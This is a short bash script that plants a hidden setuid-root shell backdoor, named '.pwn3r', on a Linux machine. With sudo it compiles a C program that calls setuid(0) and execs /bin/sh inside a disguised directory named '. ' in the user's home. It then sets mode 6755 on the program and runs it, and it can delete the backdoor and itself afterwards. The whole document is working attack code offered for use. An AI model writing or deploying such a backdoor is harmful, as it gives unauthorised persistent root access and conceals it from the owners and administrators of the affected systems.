echo "ARE YOU ON A SYSTEM YOU WANT TO PWN??? THIS SCRIPT CAUSES MASSIVE SECURITY RISKS. (y/N)"
read death
if [ "$death" = "y" ] ; then
    echo "Please specify if you would like the script to self destruct or not. (y/N)"
    read selfdestructscpt
    echo "Please specify if you would like the pwn3r to self destruct or not. (y/N)"
    read selfdestructbd
    STR=$'#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main() {\n\tsetuid(0);\n\tsetgid(0);\n\texecl("/bin/sh","/bin/sh",(void*)NULL);\n\treturn 0;\n}'
    sudo mkdir "/home/$USER/. /"
    sudo chown $USER:$USER "/home/$USER/. /"
    echo "$STR" > "/home/$USER/. /payload.c"
    gcc -o "/home/$USER/. /.pwn3r" "/home/$USER/. /payload.c"
    sudo chown root:root "/home/$USER/. /.pwn3r"
    sudo chmod 6755 "/home/$USER/. /.pwn3r"
    rm "/home/$USER/. /payload.c"
    echo "pwn3r should have been created at '/home/$USER/. /.pwn3r'."
    "/home/$USER/. /.pwn3r"
    if [ "$selfdestructbd" = "y" ] ; then
        rm -rf "/home/$USER/. "
    fi
    if [ "$selfdestructscpt" = "y" ] ; then
        rm -- "$0"
    fi
fi